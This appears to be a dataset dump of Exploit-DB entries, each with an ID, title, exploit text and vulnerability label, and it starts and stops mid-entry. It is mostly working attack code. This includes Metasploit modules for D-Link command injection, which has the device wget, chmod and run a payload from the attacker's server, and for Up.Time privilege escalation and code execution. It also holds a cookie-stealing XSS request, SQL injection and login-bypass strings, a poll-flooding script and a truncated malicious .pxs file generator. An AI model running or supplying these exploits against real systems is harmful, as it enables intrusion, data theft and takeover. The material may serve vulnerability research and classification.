wait for the ELF payload request', 60])       ], self.class)   end     def request(cmd,uri)     begin       res = send_request_cgi({         'uri'    => uri,         'method' => 'POST',         'vars_post' => {           ""act"" => ""ping"",           ""dst"" => ""` #{cmd}`""        }       })       return res     rescue ::Rex::ConnectionError       vprint_error(""#{rhost}:#{rport} - Failed to connect to the web server"")       return nil     end   end    def exploit     downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))     uri = '/diagnostic.php'      if target.name =~ /CMD/       if not (datastore['CMD'])         fail_with(Exploit::Failure::BadConfig, ""#{rhost}:#{rport} - Only the cmd/generic payload is compatible"")       end       cmd = payload.encoded       res = request(cmd,uri)       if (!res)         fail_with(Exploit::Failure::Unknown, ""#{rhost}:#{rport} - Unable to execute payload"")       end       print_status(""#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state"")       return     end      #thx to Juan for his awesome work on the mipsel elf support     @pl = generate_payload_exe     @elf_sent = false      #     # start our server     #     resource_uri = '/' + downfile      if (datastore['DOWNHOST'])       service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri     else       #do not use SSL       if datastore['SSL']         ssl_restore = true         datastore['SSL'] = false       end        #we use SRVHOST as download IP for the coming wget command.       #SRVHOST needs a real IP address of our download host       if (datastore['SRVHOST'] == ""0.0.0.0"" or datastore['SRVHOST'] == ""::"")         srv_host = Rex::Socket.source_address(rhost)       else         srv_host = datastore['SRVHOST']       end        service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri        print_status(""#{rhost}:#{rport} - Starting up our web service on #{service_url} ..."")       start_service({'Uri' => {         'Proc' => Proc.new { |cli, req|           on_request_uri(cli, req)         },         'Path' => resource_uri       }})        datastore['SSL'] = true if ssl_restore     end      #     # download payload     #     print_status(""#{rhost}:#{rport} - Asking the DLink device to download #{service_url}"")     #this filename is used to store the payload on the device     filename = rand_text_alpha_lower(8)      #not working if we send all command together -> lets take three requests     cmd = ""/usr/bin/wget #{service_url} -O /tmp/#{filename}""     res = request(cmd,uri)     if (!res)       fail_with(Exploit::Failure::Unknown, ""#{rhost}:#{rport} - Unable to deploy payload"")     end      # wait for payload download     if (datastore['DOWNHOST'])       print_status(""#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the Dlink device to download the payload"")       select(nil, nil, nil, datastore['HTTP_DELAY'])     else       wait_linux_payload     end     register_file_for_cleanup(""/tmp/#{filename}"")      #     # chmod     #     cmd = ""chmod 777 /tmp/#{filename}""     print_status(""#{rhost}:#{rport} - Asking the Dlink device to chmod #{downfile}"")     res = request(cmd,uri)     if (!res)       fail_with(Exploit::Failure::Unknown, ""#{rhost}:#{rport} - Unable to deploy payload"")     end      #     # execute     #     cmd = ""/tmp/#{filename}""     print_status(""#{rhost}:#{rport} - Asking the Dlink device to execute #{downfile}"")     res = request(cmd,uri)     if (!res)       fail_with(Exploit::Failure::Unknown, ""#{rhost}:#{rport} - Unable to deploy payload"")     end    end    # Handle incoming requests from the server   def on_request_uri(cli, request)     #print_status(""on_request_uri called: #{request.inspect}"")     if (not @pl)       print_error(""#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!"")       return     end     print_status(""#{rhost}:#{rport} - Sending the payload to the server..."")     @elf_sent = true     send_response(cli, @pl)   end    # wait for the data to be sent   def wait_linux_payload     print_status(""#{rhost}:#{rport} - Waiting for the victim to request the ELF payload..."")      waited = 0     while (not @elf_sent)       select(nil, nil, nil, 1)       waited += 1       if (waited > datastore['HTTP_DELAY'])         fail_with(Exploit::Failure::Unknown, ""#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?"")       end     end   end  end",OS Command injection,1
10256,"WordPress Plugin WP-Polls 2.x - Incorrect Flood Filter # Exploit Title: WP-Polls 2.x Incorrect Flood Filter # Date: 30/11/2009 # Author: Jbyte (jbyte-security.blogspot.com) # Software Link: http://lesterchan.net/wordpress/readme/wp-polls.html # Version: 2.x # Tested on: Windows 7/windows xp/ ubuntu 9.04/ ubuntu 9.10 # Code :  <?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, ""http://server/wp-content/plugins/wp-polls/wp-polls.php""); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_POSTFIELDS,""vote=true&poll_id=ID survey here&poll_7=ID to vote here""); curl_exec($ch);  curl_close($ch); ?>",Incorrect Flood Filter,1
48530,"EyouCMS 1.4.6 - Persistent Cross-Site Scripting # Exploit Title: EyouCMS 1.4.6 - Persistent Cross-Site Scripting # Date: 2020-05-28 # Exploit Author: China Banking and Insurance Information Technology Management Co.,Ltd. # Vendor Homepage: https://eyoucms.com # Software Link: https://qiniu.eyoucms.com/EyouCMS-V1.4.6-UTF8-SP2.zip # Version: EyouCMS V1.4.6 # Tested on: Windows # CVE : N/A  Vulnerable Request: POST /EyouCMS/index.php?m=user&c=UsersRelease&a=article_add HTTP/1.1 Host: 192.168.31.244 Content-Length: 131 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://192.168.31.244 Referer: http://192.168.31.244/EyouCMS/index.php?m=user&c=UsersRelease&a=article_add Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: users_id=4; home_lang=cn; admin_lang=cn; PHPSESSID=mahba3d6smn8d400pedi9n9gl0; referurl=http%3A%2F%2F192.168.31.244%2FEyouCMS%2Findex.php Connection: close  title=test&typeid=9&tags=&litpic_inpiut=&addonFieldExt%5Bcontent%5D=111<img src=1 onerror=alert(document.cookie)>&__token__=b90d4bf2356b81f65284238857b91ada    王新峰    技术管理部 中国银行保险信息技术管理有限公司",Persistent Cross-Site Scripting,1
41063,MC Smart Shop Script - SQL Injection # # # # #  # Vulnerability: SQL Injection Web Vulnerability # Date: 15.01.2017 # Vendor Homepage: http://microcode.ws/ # Script Name: MC Smart Shop Script # Script Buy Now: http://microcode.ws/product/mc-smart-shop-php-script/3855 # Author: İhsan Şencan # Author Web: http://ihsan.net # Mail : ihsan[beygir]ihsan[nokta]net # # # # #  # SQL Injection/Exploit : # http://localhost/[PATH]/category.php?id=[SQL] # http://localhost/[PATH]/product.php?p=[Permalink]&id=[SQL] # http://localhost/[PATH]/category.php?p=[SQL] # http://localhost/[PATH]/product.php?p=[SQL] # E.t.c.... Don't look for nothing there are also security vulnerabilities in other files as well. #  # Admin Login Bypass # http://localhost/[PATH]/adminlogin.php and set Mail:1@1.com and Password to 'or''=' and hit enter. # # # # #,SQL Injection,1
38733,"Idera Up.Time Monitoring Station 7.4 - 'post2file.php' Arbitrary File Upload (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core' require 'nokogiri'  class Metasploit4 < Msf::Exploit::Remote    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::PhpEXE    def initialize(info = {})     super(update_info(info,       'Name'            => 'Idera Up.Time Monitoring Station 7.4 post2file.php Arbitrary File Upload',       'Description'     => %q{         This module exploits a vulnerability found in Uptime version 7.4.0 and 7.5.0.          The vulnerability began as a classic arbitrary file upload vulnerability in post2file.php,         which can be exploited by exploits/multi/http/uptime_file_upload_1.rb, but it was mitigated         by the vendor.          Although the mitigiation in place will prevent uptime_file_upload_1.rb from working, it         can still be bypassed and gain privilege escalation, and allows the attacker to upload file         again, and execute arbitrary commands.       },       'License'         => MSF_LICENSE,       'Author'          =>         [           'Denis Andzakovic', # Found file upload bug in post2file.php in 2013           'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>',           'Gjoko Krstic(LiquidWorm) <gjoko[at]zeroscience.mk>'         ],       'References'      =>         [           ['EDB', '37888'],           ['URL', 'http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5254.php']         ],        'Platform'       => ['php'],        'Arch'           => ARCH_PHP,        'Targets'        => [['Automatic', {}]],        'Privileged'     => 'true',        'DefaultTarget'  => 0,        # The post2file.php vuln was reported in 2013 by Denis Andzakovic. And then on Aug 2015,        # it was discovered again by Ewerson 'Crash' Guimaraes.        'DisclosureDate' => 'Nov 18 2013'     ))      register_options(       [         Opt::RPORT(9999),         OptString.new('USERNAME', [true, 'The username to authenticate as', 'sample']),         OptString.new('PASSWORD', [true, 'The password to authenticate with', 'sample'])       ], self.class)      register_advanced_options(       [         OptString.new('UptimeWindowsDirectory', [true, 'Uptime installation path for Windows', 'C:\\Program Files\\uptime software\\']),         OptString.new('UptimeLinuxDirectory', [true, 'Uptime installation path for Linux', '/usr/local/uptime/']),         OptString.new('CmdPath', [true, 'Path to cmd.exe', 'c:\\windows\\system32\\cmd.exe'])       ], self.class)   end    def print_status(msg='')     super(""#{rhost}:#{rport} - #{msg}"")   end    def print_error(msg='')     super(""#{rhost}:#{rport} - #{msg}"")   end    def print_good(msg='')     super(""#{rhost}:#{rport} - #{msg}"")   end    # Application Check   def check     res = send_request_cgi(       'method' => 'GET',       'uri'    => normalize_uri(target_uri.path)     )      unless res       vprint_error(""Connection timed out."")       return Exploit::CheckCode::Unknown     end      n = Nokogiri::HTML(res.body)     uptime_text = n.at('//ul[@id=""uptimeInfo""]//li[contains(text(), ""up.time"")]')      if uptime_text       version = uptime_text.text.scan(/up\.time ([\d\.]+)/i).flatten.first       vprint_status(""Found version: #{version}"")       if version >= '7.4.0' && version <= '7.5.0'         return Exploit::CheckCode::Appears       end     end      Exploit::CheckCode::Safe   end    def create_exec_service(*args)     cookie_split, rhost, uploadpath, phppath, phpfile_name, cmd, cmdargs = *args     res_service = send_request_cgi(       'method' => 'POST',       'uri'    => normalize_uri(target_uri.path, 'main.php'),       'cookie' => ""#{cookie_split[1]}; #{cookie_split[2]}"",       'vars_get' => {         'section'          => 'ERDCInstance',         'subsection'       => 'add',       },       'vars_post' => {         'initialERDCId' => '20',         'target' => '1',         'targetType' => 'systemList',         'systemList' => '1',         'serviceGroupList' => '-10',         'initialMode' => 'standard',         'erdcName' => 'Exploit',         'erdcInitialName' => '',         'erdcDescription' => 'Exploit',         'hostButton' => 'system',         'erdc_id' => '20',         'forceReload' => '0',         'operation' => 'standard',         'erdc_instance_id' => '',         'label_[184]' => 'Script Name',         'value_[184]' => cmd,         'id_[184]' => 'process',         'name_[process]' => '184',         'units_[184]' => '',         'guiBasic_[184]' => '1',         'inputType_[184]' => 'GUIString',         'screenOrder_[184]' => '1',         'parmType_[184]' => '1',         'label_[185]' => 'Arguments',         'value_[185]' => cmdargs,         'id_[185]' => 'args',         'name_[args]' => '185',         'units_[185]' => '',         'guiBasic_[185]' => '1',         'inputType_[185]' => 'GUIString',         'screenOrder_[185]' => '2',         'parmType_[185]' => '1',         'label_[187]' => 'Output',         'can_retain_[187]' => 'false',         'comparisonWarn_[187]' => '-1',         'comparison_[187]' => '-1',         'id_[187]' => 'value_critical_output',         'name_[output]' => '187',         'units_[187]' => '',         'guiBasic_[187]' => '1',         'inputType_[187]' => 'GUIString',         'screenOrder_[187]' => '4',         'parmType_[187]' => '2',         'label_[189]' => 'Response time',         'can_retain_[189]' => 'false',         'comparisonWarn_[189]' => '-1',         'comparison_[189]' => '-1',         'id_[189]' => 'value_critical_timer',         'name_[timer]' => '189',         'units_[189]' => 'ms',         'guiBasic_[189]' => '0',         'inputType_[189]' => 'GUIInteger',         'screenOrder_[189]' => '6',         'parmType_[189]' => '2',         'timing_[erdc_instance_monitored]' => '1',         'timing_[timeout]' => '60',         'timing_[check_interval]' => '10',         'timing_[recheck_interval]' => '1',         'timing_[max_rechecks]' => '3',         'alerting_[notification]' => '1',         'alerting_[alert_interval]' => '120',         'alerting_[alert_on_critical]' => '1',         'alerting_[alert_on_warning]' => '1',         'alerting_[alert_on_recovery]' => '1',         'alerting_[alert_on_unknown]' => '1',         'time_period_id' => '1',         'pageFinish' => 'Finish',         'pageContinue' => 'Continue...',         'isWizard' => '1',         'wizardPage' => '2',         'wizardNumPages' => '2',         'wizardTask' => 'pageFinish',         'visitedPage[1]' => '1',         'visitedPage[2]' => '1'       })   end    def exploit     vprint_status('Trying to login...')     # Application Login     res_auth = send_request_cgi(       'method' => 'POST',       'uri'    => normalize_uri(target_uri.path, 'index.php'),       'vars_post' => {         'username' => datastore['USERNAME'],         'password' => datastore['PASSWORD']       })      unless res_auth       fail_with(Failure::Unknown, 'Connection timed out while trying to login')     end      # Check OS     phpfile_name = rand_text_alpha(10)     if res_auth.headers['Server'] =~ /Unix/       vprint_status('Found Linux installation - Setting appropriated PATH')       phppath = Rex::FileUtils.normalize_unix_path(datastore['UptimeLinuxDirectory'], 'apache/bin/ph')       uploadpath = Rex::FileUtils.normalize_unix_path(datastore['UptimeLinuxDirectory'], 'GUI/wizards')        cmdargs = ""#{uploadpath}#{phpfile_name}.txt""       cmd = phppath     else       vprint_status('Found Windows installation - Setting appropriated PATH')       phppath = Rex::FileUtils.normalize_win_path(datastore['UptimeWindowsDirectory'], 'apache\\php\\php.exe')       uploadpath = Rex::FileUtils.normalize_win_path(datastore['UptimeWindowsDirectory'], 'uptime\\GUI\\wizards\\')       cmd = datastore['CmdPath']       cmdargs = ""/K \""\""#{phppath}\"" \""#{uploadpath}#{phpfile_name}.txt\""\""""     end      if res_auth.get_cookies =~ /login=true/       cookie = Regexp.last_match(1)       cookie_split = res_auth.get_cookies.split(';')       vprint_status(""Cookies Found: #{cookie_split[1]} #{cookie_split[2]}"")       print_good('Login success')        # Privilege escalation getting user ID       res_priv = send_request_cgi(         'method' => 'GET',         'uri'    => normalize_uri(target_uri.path, 'main.php'),         'vars_get' => {           'page'    => 'Users',           'subPage' => 'UserContainer'         },        'cookie' => ""#{cookie_split[1]}; #{cookie_split[2]}""       )        unless res_priv         fail_with(Failure::Unknown, 'Connection timed out while getting userID.')       end        matchdata = res_priv.body.match(/UPTIME\.CurrentUser\.userId\.*/)        unless matchdata         fail_with(Failure::Unknown, 'Unable to find userID for escalation')       end        get_id = matchdata[0].gsub(/[^\d]/, '')       vprint_status('Escalating privileges...')        # Privilege escalation post       res_priv_elev = send_request_cgi(         'method' => 'POST',         'uri'    => normalize_uri(target_uri.path, 'main.php'),         'vars_get' => {           'section'          => 'UserContainer',           'subsection'       => 'edit',           'id'               => ""#{get_id}""         },         'cookie' => ""#{cookie_split[1]}; #{cookie_split[2]}"",         'vars_post' => {           'operation' => 'submit',           'disableEditOfUsernameRoleGroup' => 'false',           'username' => datastore['USERNAME'],           'password' => datastore['PASSWORD'],           'passwordConfirm' => datastore['PASSWORD'],           'firstname' => rand_text_alpha(10),           'lastname' => rand_text_alpha(10),           'location' => '',           'emailaddress' => '',           'emailtimeperiodid' => '1',           'phonenumber' => '',           'phonenumbertimeperiodid' => '1',           'windowshost' => '',           'windowsworkgroup' => '',           'windowspopuptimeperiodid' => '1',           'landingpage' => 'MyPortal',           'isonvacation' => '0',           'receivealerts' => '0',           'activexgraphs' => '0',           'newuser' => 'on',           'newuser' => '1',           'userroleid' => '1',           'usergroupid[]' => '1'         }       )        unless res_priv_elev         fail_with(Failure::Unknown, 'Connection timed out while escalating...')       end        # Refresing perms       vprint_status('Refreshing perms...')       res_priv = send_request_cgi(         'method' => 'GET',         'uri'    => normalize_uri(target_uri.path, 'index.php?loggedout'),         'cookie' => ""#{cookie_split[1]}; #{cookie_split[2]}""       )        unless res_priv         fail_with(Failure::Unknown, 'Connection timed out while refreshing perms')       end        res_auth = send_request_cgi(         'method' => 'POST',         'uri'    => normalize_uri(target_uri.path, 'index.php'),         'vars_post' => {           'username' => datastore['USERNAME'],           'password' => datastore['PASSWORD']         }       )        unless res_auth         fail_with(Failure::Unknown, 'Connection timed out while authenticating...')       end        if res_auth.get_cookies =~ /login=true/         cookie = Regexp.last_match(1)         cookie_split = res_auth.get_cookies.split(';')         vprint_status(""New Cookies Found: #{cookie_split[1]} #{cookie_split[2]}"")         print_good('Priv. Escalation success')       end        # CREATING Linux EXEC Service       if res_auth.headers['Server'] =~ /Unix/         vprint_status('Creating Linux Monitor Code exec...')         create_exec_service(cookie_split, rhost, uploadpath, phppath, phpfile_name, cmd, cmdargs)        else         # CREATING Windows EXEC Service#         vprint_status('Creating Windows Monitor Code exec...')         create_exec_service(cookie_split, rhost, uploadpath, phppath, phpfile_name, cmd, cmdargs)       end        # Upload file       vprint_status('Uploading file...')       up_res = send_request_cgi(         'method' => 'POST',         'uri'    => normalize_uri(target_uri.path, 'wizards', 'post2file.php'),         'vars_post' => {           'file_name' => ""#{phpfile_name}.txt"",           'script'    => payload.encoded         }       )        unless up_res         fail_with(Failure::Unknown, 'Connection timed out while uploading file.')       end        vprint_status('Checking Uploaded file...')       res_up_check = send_request_cgi(         'method' => 'GET',         'uri' => normalize_uri(target_uri.path, 'wizards', ""#{phpfile_name}.txt"")       )        if res_up_check && res_up_check.code == 200         print_good(""File found: #{phpfile_name}"")       else         print_error('File not found')         return       end        # Get Monitor ID        vprint_status('Fetching Monitor ID...')       res_mon_id = send_request_cgi(         'method' => 'GET',         'uri'    => normalize_uri(target_uri.path, 'ajax', 'jsonQuery.php'),         'cookie' => ""#{cookie_split[1]}; #{cookie_split[2]}"",         'vars_get' => {           'query'               => 'GET_SERVICE_PAGE_ERDC_LIST',           'iDisplayStart'       => '0',           'iDisplayLength'      => '10',           'sSearch'             => 'Exploit'         }        )        unless res_mon_id         fail_with(Failure::Unknown, 'Connection timed out while fetching monitor ID')       end        matchdata = res_mon_id.body.match(/id=?[^>]*>/)        unless matchdata         fail_with(Failure::Unknown, 'No monitor ID found in HTML body. Unable to continue.')       end        mon_get_id = matchdata[0].gsub(/[^\d]/, '')       print_good(""Monitor id aquired:#{mon_get_id}"")       # Executing monitor       send_request_cgi(         'method' => 'POST',         'uri'    => normalize_uri(target_uri.path, 'main.php'),         'cookie' => ""#{cookie_split[1]}; #{cookie_split[2]}"",         'vars_post' => {           'section'    => 'RunERDCInstance',           'subsection' => 'view',           'id'         => mon_get_id,           'name'       => 'Exploit'         }       )     else       print_error('Cookie not found')     end   end end",Arbitrary File Upload,1
26746,"A-FAQ 1.0 - 'faqDspItem.asp?faqid' SQL Injection source: https://www.securityfocus.com/bid/15741/info  A-FAQ is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  A-FAQ 1.0 and earlier versions are vulnerable; other versions may also be affected.   http://www.example.com/faqDspItem.asp?faqid=[SQL]",SQL Injection,1
25753,Hosting Controller 6.1 - 'resellerresources.asp?jresourceid' SQL Injection source: https://www.securityfocus.com/bid/13806/info  Hosting Controller is reported prone to multiple vulnerabilities. These issues can allow an attacker gain unauthorized access to data and carry out SQL injection attacks.  These issues reportedly affect Hosting Controller 6.1 HotFix 2.0 and prior versions.   http://www.example.com/admin/hosting/resellerresources.asp?action=2&jresourceid=1%20or%201=1,SQL Injection,1
35745,"Joomla! Component com_cbcontact - 'contact_id' SQL Injection source: https://www.securityfocus.com/bid/47856/info  The 'com_cbcontact' component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?option=com_cbcontact&task=vcard&contact_id=-11[SQLi] http://www.example.com/index.php?option=com_cbcontact&task=view&contact_id=-11[SQLi]",SQL Injection,1
24505,"Photodex ProShow Producer 5.0.3297 - '.pxs' Memory Corruption #!/usr/bin/python   # Exploit Title: Photodex ProShow Producer v5.0.3297 (.pxs) Memory Corruption Vulnerability # Version:       <= 5.0.3297 # Date:          2013-02-14 # Author:        Julien Ahrens (@MrTuxracer) # Homepage:      http://www.inshell.net # Software Link: http://www.photodex.com # Tested on:     Windows XP SP3 Professional German # Notes:         - # Howto:         Use the app to open the .pxs file  from struct import pack  file=""exploit.pxs""  head = (""\x50\x68\x6F\x74\x6F\x64\x65\x78\x20\x50\x72\x65\x73\x65\x6E\x74\x65\x72\x20\x53""+ ""\x74\x72\x65\x61\x6D\x1A\x0A\x0D\x0A\x1A\x00\x00\x00\x00\x04\x00\x01\x00\x6A\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xB2\x89\x00\x00\x00\x00\x00\x00\x03\x00""+ ""\x00\x00\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xBF\x0D\x00\x00\x01\xFF""+ ""\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF""+ ""\xFE\x00\x50\x46\x69\x6C\x65\x20\x77\x72\x69\x74\x74\x65\x6E\x20\x77\x69\x74\x68""+ ""\x20\x43\x6F\x6D\x70\x75\x50\x69\x63\x28\x52\x29\x20\x2D\x20\x50\x68\x6F\x74\x6F""+ ""\x64\x65\x78\x20\x43\x6F\x72\x70\x6F\x72\x61\x74\x69\x6F\x6E\x20\x28\x68\x74\x74""+ ""\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x70\x68\x6F\x74\x6F\x64\x65\x78\x2E\x63\x6F\x6D""+ ""\x29\xFF\xDB\x00\x84\x00\x05\x03\x04\x04\x04\x03\x05\x04\x04\x04\x05\x05\x05\x06""+ ""\x07\x0C\x08\x07\x07\x07\x07\x0F\x0B\x0B\x09\x0C\x11\x0F\x12\x12\x11\x0F\x11\x11""+ ""\x13\x16\x1C\x17\x13\x14\x1A\x15\x11\x11\x18\x21\x18\x1A\x1D\x1D\x1F\x1F\x1F\x13""+ ""\x17\x22\x24\x22\x1E\x24\x1C\x1E\x1F\x1E\x01\x05\x05\x05\x07\x06\x07\x0E\x08\x08""+ ""\x0E\x1E\x14\x11\x14\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E""+ ""\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E""+ ""\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\xFF\xC0\x00\x11\x08""+ ""\x00\x55\x00\x71\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01\xFF\xC4\x00\xA6\x00\x00""+ ""\x01\x04\x03\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x04\x05\x07""+ ""\x01\x02\x06\x08\x10\x00\x01\x03\x03\x01\x04\x05\x08\x06\x06\x0B\x01\x00\x00\x00""+ ""\x00\x01\x02\x03\x04\x00\x05\x11\x06\x07\x12\x21\x31\x08\x13\x22\x41\x94\x15\x51""+ ""\x55\x61\x71\x91\xD1\xD2\x14\x18\x32\x42\x56\x81\x23\x92\xA1\xA2\xB1\xC1\x16\x17""+ ""\x24\x25\x33\x43\x62\x74\x82\x84\x85\xB2\x01\x01\x00\x03\x01\x01\x01\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x01\x03\x04\x02\x05\x06\x11\x00\x02\x02\x01\x03""+ ""\x03\x02\x05\x00\x0A\x03\x00\x00\x00\x00\x00\x00\x01\x02\x03\x11\x04\x21\x31\x12""+ ""\x13\x51\x05\x41\x14\x22\x52\x71\x81\x15\x23\x32\x33\x61\x91\xA1\xB1\xF0\xF1\xC1""+ ""\xD1\xE1\xFF\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00\xF1\x95\x00\x50""+ ""\x05\x00\x50\x05\x00\x50\x05\x00\x50\x05\x00\x50\x05\x00\x50\x05\x00\x50\x05\x00""+ ""\x50\x1D\x96\xCA\xB6\x7F\x74\xDA\x25\xEE\x55\xAA\xD7\x3A\xDD\x09\x51\x62\x2E\x63""+ ""\xCF\x4E\x74\xB6\xDA\x1B\x49\x00\x92\x40\x3E\x71\x52\x93\x6F\x08\x86\xF0\xB2\xCB""+ ""\x1D\xAE\x8C\x9A\x91\xD1\x96\xF5\xA6\x89\x50\xF5\x5C\x17\xF2\x55\x9D\x8B\x3C\x15""+ ""\xF7\xEB\xF2\x28\x3A\x2E\xEA\xA3\xCB\x58\x68\xBF\x1E\xBF\x92\xA7\xB1\x67\xD2\xC7""+ ""\x7E\xBF\x26\x7E\xAB\x9A\xAF\xF1\x7E\x8C\xF1\xEB\xF9\x29\xD8\xB3\xE9\x1D\xFA\xFC""+ ""\x99\xFA\xAD\xEA\xCF\xC5\xDA\x33\xC7\xAF\xE4\xA8\xEC\x59\xF4\x8E\xF5\x7E\x4C\x7D""+ ""\x56\xF5\x67\xE2\xED\x19\xE3\xD7\xF2\x53\xB1\x67\x81\xDE\xAF\xC8\x7D\x57\x35\x5F""+ ""\xE2\xFD\x19\xE3\xD7\xF2\x53\xB3\x67\x82\x7B\xB0\x7C\x33\x3F\x55\xAD\x5C\x46\x46""+ ""\xAD\xD1\xA4\x7F\xBE\x5F\xC9\x5C\xF6\xE5\xE0\xEB\xA9\x1A\xAB\xA2\xEE\xAB\x4F\xDA""+ ""\xD5\xFA\x30\x7F\xDF\x5F\xC9\x5D\x2A\x66\xFD\x8E\x5D\xB0\x5C\xB3\x53\xD1\x87\x53""+ ""\x8E\x7A\xCB\x45\x78\xF5\xFC\x95\x3F\x0F\x67\xD2\xC8\xEF\xD7\xE4\xD4\xF4\x65\xD4""+ ""\xA3\x9E\xB4\xD1\x23\xFF\x00\x41\x7F\x25\x3E\x1E\xDF\xA5\x91\xDF\xAF\xEA\x38\xAD""+ ""\xAD\x6C\xA6\xF7\xB3\x88\xB6\xB9\x77\x3B\x9D\xA2\xE1\x1E\xE6\x5D\x0C\x39\x6F\x7C""+ ""\xB8\x9C\xB6\x40\x50\x39\x03\xCE\x2A\xB9\x41\xC1\xE2\x48\xB2\x32\x52\x59\x4C\xAE""+ ""\xEB\x93\xA0\xA0\x0A\x02\xF5\xE8\x74\x90\xAD\x55\xAB\x12\x46\x41\xD2\xF2\xB8\x7F""+ ""\xC9\x15\xD4\x1E\x24\x99\x12\x5D\x4B\x0C\xF4\xD6\x90\xB4\x32\xE4\x34\x2B\x74\x1E""+ ""\xC8\xCF\x0E\x55\xEB\x53\x7E\x76\x67\x9B\x7E\x99\x47\x78\xB3\xA9\x6E\xC8\xC6\x07""+ ""\xE8\xD3\xEE\xAB\xDD\x89\x7B\x99\x15\x52\x6F\x64\x2D\xE4\x46\x12\x70\xA6\xD2\x0F""+ ""\xAC\x54\x2B\x22\xD6\x53\x25\xD5\x34\xF0\xD0\x2A\xD5\x0D\xBF\xB6\x1B\x1E\xDA\xE7""+ ""\xB9\x1F\x27\x4A\x8B\x1F\xB1\xAB\x96\xE8\x08\xE2\xA2\xD0\xF7\x57\x2A\xD8\xBE\x0B""+ ""\x1E\x96\xC5\xC8\x9B\x30\xEC\xEB\x74\xB4\xEB\xED\xB4\xA0\x46\x32\x8C\x83\x55\xD9""+ ""\x7C\xA3\xBC\x63\x92\xFA\x74\x9D\x5B\x4A\x58\x63\xA6\xAC\xB6\xC5\x65\x48\x75\x97""+ ""\x08\xFB\xA8\x50\x49\xAC\xD3\xD5\x67\x67\x1C\x7D\xD1\xAE\xBD\x13\x8E\xFD\x59\xFB""+ ""\x30\x76\x15\xB9\xB6\x4A\x56\xDC\x85\x67\xCE\x90\x6A\xA5\xD7\x29\x66\x38\x2F\x6A""+ ""\x11\x8E\x27\x9F\xC9\x05\x2E\x2C\x02\x4E\x22\x2F\x03\xBF\x76\xB6\x42\xCB\x51\x8E""+ ""\xCA\x29\x96\xF9\x23\xDD\xB7\xC5\x58\xE1\x15\x69\x07\xBC\x81\x5A\x23\x6C\xFD\xD2""+ ""\x32\x4F\x4F\x52\xDD\x49\x94\x7F\x4D\x36\x52\xC6\x88\xD0\x6D\x20\x60\x07\xAE\x07""+ ""\xF7\x91\x5E\x6E\xB1\xE6\xD6\x6D\xD2\xAC\x57\x84\x79\x6A\xB2\x9A\x02\x80\x28\x0B""+ ""\xCF\xA1\xEA\xFA\xBD\x4F\xAB\x57\x8C\xEE\xE9\x79\x47\xF7\x91\x53\x15\x97\x81\x9C""+ ""\x1E\x94\xD1\xD7\xC5\xFD\x15\xB0\x90\x52\x30\x07\x01\xC0\xD6\xC8\xD2\xF0\x72\xEE""+ ""\x5E\xE7\x4A\xCD\xF6\x57\x5E\x0A\x02\x8A\xFB\x86\xEF\x3A\xED\xD5\xB6\xE4\x2B\x52""+ ""\x79\x43\xB4\xDC\xE7\x48\x27\x09\x52\x57\x9C\xF2\xAA\xBB\x6A\x1B\x16\x77\x3A\xF7""+ ""\x1C\xB2\x24\xBA\xBC\x4C\x88\x5C\x4A\xBE\xF2\x4E\x28\xE3\x24\xB3\x06\x42\xBA\x0D""+ ""\xB5\x34\x6A\xED\x82\x33\x8A\xCA\x9C\x90\x90\x78\x80\x55\x9F\xE5\x5A\x23\x64\xD2""+ 